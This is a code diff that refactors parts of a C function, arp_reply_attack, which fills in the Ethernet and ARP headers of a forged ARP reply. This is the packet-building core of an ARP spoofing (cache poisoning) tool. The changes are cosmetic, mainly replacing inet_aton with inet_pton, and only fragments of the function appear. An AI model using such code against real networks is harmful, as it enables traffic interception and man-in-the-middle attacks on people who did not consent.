@@ -14,12 +14,10 @@ int arp_reply_attack(char* interface, char * senderIp, char * targetIp, u_char* 
 	u_char* packet = (u_char*)calloc(60 ,sizeof(u_char));
 	u_char* requestPacket = packet;
 
-	struct ether_header *etherHeader;
-	etherHeader = (ether_header *)requestPacket;
-	const u_char *mac = get_my_mac_address(interface);
+	struct ether_header* etherHeader = (ether_header *)requestPacket;
+	u_char *mac = get_my_mac_address(interface);
 
-	if (mac == NULL)
-		return -1;
+	if (mac == NULL) return -1;
 
 	for(int i = 0; i < 6; i++)
 	{
@@ -45,7 +43,7 @@ int arp_reply_attack(char* interface, char * senderIp, char * targetIp, u_char* 
 	}
 
 	struct sockaddr_in senderAddr;
-	inet_aton(senderIp, &senderAddr.sin_addr);
+	inet_pton(AF_INET, senderIp, &senderAddr.sin_addr); // convert IPv4 addresses from text to binary form
 
 	arpHeader->arp_spa[0] = (htonl(senderAddr.sin_addr.s_addr) & 0xff000000) >> 24; // sender protocol address
 	arpHeader->arp_spa[1] = (htonl(senderAddr.sin_addr.s_addr) & 0x00ff0000) >> 16;
@@ -53,7 +51,7 @@ int arp_reply_attack(char* interface, char * senderIp, char * targetIp, u_char* 
 	arpHeader->arp_spa[3] = htonl(senderAddr.sin_addr.s_addr) & 0x000000ff;
 
 	struct sockaddr_in targetAddr;
-	inet_aton(targetIp, &targetAddr.sin_addr);
+	inet_pton(AF_INET, targetIp, &targetAddr.sin_addr);
 
 	arpHeader->arp_tpa[0] = (htonl(targetAddr.sin_addr.s_addr) & 0xff000000) >> 24; // target protocol address
 	arpHeader->arp_tpa[1] = (htonl(targetAddr.sin_addr.s_addr) & 0x00ff0000) >> 16;
